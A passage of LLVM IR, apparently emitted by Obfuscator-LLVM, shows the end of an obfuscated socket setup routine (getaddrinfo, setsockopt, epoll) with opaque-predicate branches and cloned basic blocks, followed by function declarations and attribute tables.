  %125 = sub i32 %123, 1
  %126 = mul i32 %123, %125
  %127 = urem i32 %126, 2
  %128 = icmp eq i32 %127, 0
  %129 = icmp slt i32 %124, 10
  %130 = or i1 %128, %129
  br i1 %130, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %25

; <label>:131:                                    ; preds = %originalBBpart28, %25
  %132 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %133 = icmp eq %struct.addrinfo* %132, null
  br i1 %133, label %134, label %137

; <label>:134:                                    ; preds = %131
  %135 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %136 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %135, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.90, i32 0, i32 0))
  store i32 -1, i32* %2, align 4
  br label %156

; <label>:137:                                    ; preds = %131
  %138 = load i32, i32* @x.21
  %139 = load i32, i32* @y.22
  %140 = sub i32 %138, 1
  %141 = mul i32 %138, %140
  %142 = urem i32 %141, 2
  %143 = icmp eq i32 %142, 0
  %144 = icmp slt i32 %139, 10
  %145 = or i1 %143, %144
  br i1 %145, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %137
  %146 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  call void @freeaddrinfo(%struct.addrinfo* %146) #7
  %147 = load i32, i32* %8, align 4
  store i32 %147, i32* %2, align 4
  %148 = load i32, i32* @x.21
  %149 = load i32, i32* @y.22
  %150 = sub i32 %148, 1
  %151 = mul i32 %148, %150
  %152 = urem i32 %151, 2
  %153 = icmp eq i32 %152, 0
  %154 = icmp slt i32 %149, 10
  %155 = or i1 %153, %154
  br i1 %155, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %156

; <label>:156:                                    ; preds = %originalBBpart216, %134, %18
  %157 = load i32, i32* @x.21
  %158 = load i32, i32* @y.22
  %159 = sub i32 %157, 1
  %160 = mul i32 %157, %159
  %161 = urem i32 %160, 2
  %162 = icmp eq i32 %161, 0
  %163 = icmp slt i32 %158, 10
  %164 = or i1 %162, %163
  br i1 %164, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %156
  %165 = load i32, i32* %2, align 4
  %166 = load i32, i32* @x.21
  %167 = load i32, i32* @y.22
  %168 = sub i32 %166, 1
  %169 = mul i32 %166, %168
  %170 = urem i32 %169, 2
  %171 = icmp eq i32 %170, 0
  %172 = icmp slt i32 %167, 10
  %173 = or i1 %171, %172
  br i1 %173, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  ret i32 %165

originalBBalteredBB:                              ; preds = %originalBB, %41
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %63
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.89, i32 0, i32 0))
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %91
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %111
  %174 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %175 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %174, i32 0, i32 7
  %176 = load %struct.addrinfo*, %struct.addrinfo** %175, align 8
  store %struct.addrinfo* %176, %struct.addrinfo** %6, align 8
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %137
  %177 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  call void @freeaddrinfo(%struct.addrinfo* %177) #7
  %178 = load i32, i32* %8, align 4
  store i32 %178, i32* %2, align 4
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %156
  %179 = load i32, i32* %2, align 4
  br label %originalBB18
}

; Function Attrs: noreturn nounwind
declare void @abort() #6

; Function Attrs: nounwind
declare i32 @epoll_create1(i32) #3

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #7

declare i32 @fcntl(i32, i32, ...) #1

declare i32 @getaddrinfo(i8*, i8*, %struct.addrinfo*, %struct.addrinfo**) #1

; Function Attrs: nounwind
declare i8* @gai_strerror(i32) #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @freeaddrinfo(%struct.addrinfo*) #3

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { argmemonly nounwind }
attributes #5 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { nounwind }
attributes #8 = { nounwind readonly }
attributes #9 = { nounwind readnone }
attributes #10 = { noreturn nounwind }

!llvm.ident = !{!0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
